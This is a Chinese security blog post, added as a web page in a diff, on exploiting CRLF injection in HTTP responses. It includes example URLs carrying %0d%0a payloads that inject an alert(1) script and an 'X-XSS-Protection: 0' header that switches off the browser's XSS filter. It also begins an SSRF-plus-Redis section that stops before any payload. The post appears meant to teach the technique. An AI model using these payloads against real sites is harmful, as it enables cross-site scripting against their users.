@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<title>
+  
+    CRLF漏洞利用方法
+  
+</title>
+
+<meta name="description" content="CRLF 漏洞利用方法​    简单记录下CRLF漏洞。">
+<meta name="keywords" content="WEB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CRLF漏洞利用方法">
+<meta property="og:url" content="http://spikesec.cn/2018/02/02/CRLF漏洞利用方法/index.html">
+<meta property="og:site_name" content="Spike Security">
+<meta property="og:description" content="CRLF 漏洞利用方法​    简单记录下CRLF漏洞。">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-03-01T08:17:24.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CRLF漏洞利用方法">
+<meta name="twitter:description" content="CRLF 漏洞利用方法​    简单记录下CRLF漏洞。">
+
+
+  <link rel="alternative" href="/atom.xml" title="Spike Security" type="application/atom+xml">
+
+
+
+  <link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="/perfect-scrollbar/css/perfect-scrollbar.min.css">
+<link rel="stylesheet" href="/styles/main.css">
+
+
+
+
+
+
+</head>
+<body
+  
+    class="monochrome"
+  
+  >
+  <div class="mobile-header">
+  <button class="sidebar-toggle" type="button">
+    <span class="icon-bar"></span>
+    <span class="icon-bar"></span>
+    <span class="icon-bar"></span>
+  </button>
+  <a class="title" href="/">Spike Security</a>
+</div>
+
+  <div class="main-container">
+    <div class="sidebar">
+  <div class="header">
+    <h1 class="title"><a href="/">Spike Security</a></h1>
+    
+    <div class="info">
+      <div class="content">
+        
+        
+          <div class="author">Spike</div>
+        
+      </div>
+      
+        <div class="avatar">
+          
+            <a href="/about"><img src="/images/cc/avatar.jpeg"></a>
+          
+        </div>
+      
+    </div>
+  </div>
+  <div class="body">
+    
+      
+        <ul class="nav">
+          
+            
+              <li class="category-list-container">
+                <a href="javascript:;">Category</a>
+                
+              </li>
+            
+          
+            
+              <li class="tag-list-container">
+                <a href="javascript:;">Tag</a>
+                <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Security/">Security</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB/">WEB</a><span class="tag-list-count">11</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/other/">other</a><span class="tag-list-count">2</span></li></ul>
+              </li>
+            
+          
+            
+              <li class="archive-list-container">
+                <a href="javascript:;">Archive</a>
+                <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/">2017</a><span class="archive-list-count">10</span></li></ul>
+              </li>
+            
+          
+        </ul>
+      
+        <ul class="nav">
+          
+            
+              <li>
+                <a href="/" title="Homepage">Homepage</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="/archives" title="By Year">By Year</a>
+              </li>
+            
+          
+        </ul>
+      
+        <ul class="nav">
+          
+            
+              <li>
+                <a href="http://weibo.com/spikex" title="Weibo" target="_blank" rel="noopener">Weibo</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="https://github.com/SpikeI" title="Github" target="_blank" rel="noopener">Github</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="/atom.xml" title="RSS">RSS</a>
+              </li>
+            
+          
+        </ul>
+      
+    
+  </div>
+</div>
+
+    <div class="main-content">
+      
+        <div style="max-width: 1000px">
+      
+          <article id="post-CRLF漏洞利用方法" class="article article-type-post">
+  
+    <h1 class="article-header">
+      CRLF漏洞利用方法
+    </h1>
+  
+  
+
+  <div class="article-info">
+    <span class="article-date">
+  2018-02-02
+</span>
+
+    
+
+    
+	<span class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB/">WEB</a></li></ul>
+	</span>
+
+
+  </div>
+  <div class="article-entry">
+    <h1 id="CRLF-漏洞利用方法"><a href="#CRLF-漏洞利用方法" class="headerlink" title="CRLF 漏洞利用方法"></a>CRLF 漏洞利用方法</h1><p>​    简单记录下CRLF漏洞。</p>
+<a id="more"></a>
+<h2 id="0x1-简介"><a href="#0x1-简介" class="headerlink" title="0x1 简介"></a>0x1 简介</h2><p>​    CRLF是”\r\n”的简称。在HTTP协议中，不同的字段之间会用CRLF隔开，其中Http header和http Body之间是由两个CRLF隔开的。CRLF漏洞指的是在返回的Http头中存在我们可控字段，此时我们插入CRLF，Http协议就会将由CRLF隔开的部分当作不同名称的字段了</p>
+<p>​    举个栗子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://evil.com/?url=http://iiimSp1ke.com</span><br></pre></td></tr></table></figure>
+<p>​    访问这个链接，后台的逻辑是将<code>http://iiimSp1ke.com</code>插入location中，通过客户端跳转，没有做其他处理。此时接收到的返回数据包应该是类似于这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Fri, 02 Feb 2018 04:24:23 GMT</span><br><span class="line">Content-Length: 801</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html;charset=UTF-8</span><br><span class="line">Location: http://iiimSp1ke.com</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt;Index of /&lt;/title&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> ...</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>​    此时我们可以将url参数设置成：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://evil.com/?url=%0d%0a%0d%0a&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>​    这时返回的html页面应该像下面这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Fri, 02 Feb 2018 04:24:23 GMT</span><br><span class="line">Content-Length: 801</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html;charset=UTF-8</span><br><span class="line">Location: </span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(1);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt;Index of /&lt;/title&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> ...</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>​    此时<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>就会被浏览器解析，弹框。</p>
+<h2 id="0x2-无视浏览器防御的XSS"><a href="#0x2-无视浏览器防御的XSS" class="headerlink" title="0x2 无视浏览器防御的XSS"></a>0x2 无视浏览器防御的XSS</h2><p>​    CRLF可以被用作无视浏览器的XSS，其原因是浏览器的xss-author是默认开启的，就是如果url中有疑似xss的语句并且在返回数据中出现，那么会被xss拦截，bypass xss author也是一门学问，网上有很多相关讨论，这里不在赘述。但xss author是可以被关闭的。在返回头中加入一条header既可以关闭该功能:<code>X-XSS-Protection: 0</code></p>
+<p>​    所以在CRLF的时候我们通过加入一条header，让浏览器将其关闭：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://evil.com/?url=%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>​    最后结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Fri, 02 Feb 2018 04:24:23 GMT</span><br><span class="line">Content-Length: 801</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html;charset=UTF-8</span><br><span class="line">Location: </span><br><span class="line">X-XSS-Protection: 0</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(1);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt;Index of /&lt;/title&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> ...</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>​    这样就可以bypass了XD</p>
+<h2 id="配合SSRF-Redis-RCE"><a href="#配合SSRF-Redis-RCE" class="headerlink" title="配合SSRF+Redis RCE"></a>配合SSRF+Redis RCE</h2><p>​    这个最开始是P神的一篇文章<a href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html，后来被CTF用了很多次。这里也算是用到了CRLF，利用到了了Python的urllib的一个CVE：`CVE-2016-5699`。" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html，后来被CTF用了很多次。这里也算是用到了CRLF，利用到了了Python的urllib的一个CVE：`CVE-2016-5699`。</a></p>
+<p>​    环境是这样的，最开始是个SSRF，SSRF用的是有漏洞的urllib，内网中运行这Redis服务。</p>
+
+  </div>
+  <footer class="article-footer">
+    
+  <div class="cc">
+    <a href="http://creativecommons.org/licenses/by-sa/4.0/deed.en" target="_blank" title="Attribution-ShareAlike">
+      <img src="/images/cc/cc.png">
+      
+          <img src="/images/cc/by.png">
+        
+          <img src="/images/cc/sa.png">
+      
+      <span>
+        This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.
+      </span>
+    </a>
+  </div>
+
+
+    
+
+  </footer>
+</article>
+
+
+
+
+
+
+
+          <div class="main-footer">
+  
+    © 2018 Spike Security - Powered by <a href="http://hexo.io" target="_blank">Hexo</a> - Theme <a href="https://github.com/denjones/hexo-theme-chan" target="_blank">Chan</a>
+  
+</div>
+
+      
+        </div>
+      
+    </div>
+  </div>
+  <script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+
+  <link rel="stylesheet" href="/PhotoSwipe/photoswipe.css">
+  <link rel="stylesheet" href="/PhotoSwipe/default-skin/default-skin.css">
+
+  <!-- Root element of PhotoSwipe. Must have class pswp. -->
+  <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe.
+             It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+      <!-- Container that holds slides.
+                PhotoSwipe keeps only 3 of them in the DOM to save memory.
+                Don't modify these 3 pswp__item elements, data is added later on. -->
+      <div class="pswp__container">
+        <div class="pswp__item"></div>
+        <div class="pswp__item"></div>
+        <div class="pswp__item"></div>
+      </div>
+
+      <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+      <div class="pswp__ui pswp__ui--hidden">
+
+        <div class="pswp__top-bar">
+
+          <!--  Controls are self-explanatory. Order can be changed. -->
+
+          <div class="pswp__counter"></div>
+
+          <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+          <button class="pswp__button pswp__button--share" title="Share"></button>
+
+          <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+          <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+          <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+          <!-- element will get class pswp__preloader--active when preloader is running -->
+          <div class="pswp__preloader">
+            <div class="pswp__preloader__icn">
+              <div class="pswp__preloader__cut">
+                <div class="pswp__preloader__donut"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+          <div class="pswp__share-tooltip"></div>
+        </div>
+
+        <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+
+        <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>
+
+        <div class="pswp__caption">
+          <div class="pswp__caption__center"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/PhotoSwipe/photoswipe.js"></script>
+  <script src="/PhotoSwipe/photoswipe-ui-default.js"></script>
+
+
+<script src="/perfect-scrollbar/js/min/perfect-scrollbar.min.js"></script>
+<script src="/scripts/main.js"></script>
+
+</body>
+</html>
